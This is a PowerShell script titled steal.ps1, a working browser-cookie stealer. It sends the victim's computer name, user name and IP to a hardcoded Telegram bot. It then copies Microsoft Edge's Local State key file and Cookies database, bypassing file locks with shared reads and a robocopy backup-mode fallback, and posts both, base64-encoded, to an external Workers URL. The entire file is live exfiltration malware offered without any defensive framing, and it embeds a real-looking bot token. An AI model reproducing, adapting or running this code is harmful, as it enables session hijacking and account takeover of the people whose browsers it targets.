# steal.ps1
# Reads Edge files with FileShare.Read – works even if Edge holds the file.

$t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
$c = "6760965981"
$worker_url = "https://reciever.tyceno89.workers.dev"

# --- Send PC info to Telegram ---
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
$body = @{ chat_id = $c; text = "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip" }
Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body

# --- Function to read file bytes with shared read access ---
function Read-FileWithSharedRead {
    param($path)
    try {
        $fileStream = [System.IO.File]::Open($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read)
        $bytes = New-Object byte[] $fileStream.Length
        $fileStream.Read($bytes, 0, $bytes.Length) | Out-Null
        $fileStream.Close()
        return $bytes
    } catch {
        return $null
    }
}

# --- 1) Read Local State (rarely locked) ---
$src_ls = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
$bytes_ls = Read-FileWithSharedRead $src_ls
if (-not $bytes_ls) {
    $body = @{ chat_id = $c; text = "ERROR: Could not read Local State" }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
    exit
}
$b64_ls = [Convert]::ToBase64String($bytes_ls)

# --- 2) Read Cookies.db (likely locked) ---
$src_cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$bytes_cookies = Read-FileWithSharedRead $src_cookies
if (-not $bytes_cookies) {
    # Fallback: try to copy using robocopy /B (backup mode)
    $temp = "$env:TEMP\exfil"
    New-Item -ItemType Directory -Force -Path $temp | Out-Null
    $dst_cookies = "$temp\Edge_Cookies.db"
    $src_dir = Split-Path $src_cookies
    $src_file = Split-Path $src_cookies -Leaf
    robocopy $src_dir $temp $src_file /B /R:1 /W:1 /NFL /NDL /NJH /NJS | Out-Null
    if (Test-Path $dst_cookies) {
        $bytes_cookies = [System.IO.File]::ReadAllBytes($dst_cookies)
        Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
    } else {
        $body = @{ chat_id = $c; text = "ERROR: Could not read Cookies.db" }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
        exit
    }
}
$b64_cookies = [Convert]::ToBase64String($bytes_cookies)

# --- 3) Send both files to worker ---
$payload = @{
    pc = $env:COMPUTERNAME
    user = $env:USERNAME
    files = @{
        "Edge_LocalState.json" = $b64_ls
        "Edge_Cookies.db" = $b64_cookies
    }
} | ConvertTo-Json -Depth 10

try {
    Invoke-RestMethod -Uri $worker_url -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
    $body = @{ chat_id = $c; text = "Both files sent successfully" }
} catch {
    $body = @{ chat_id = $c; text = "ERROR sending to worker: $_" }
}
Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
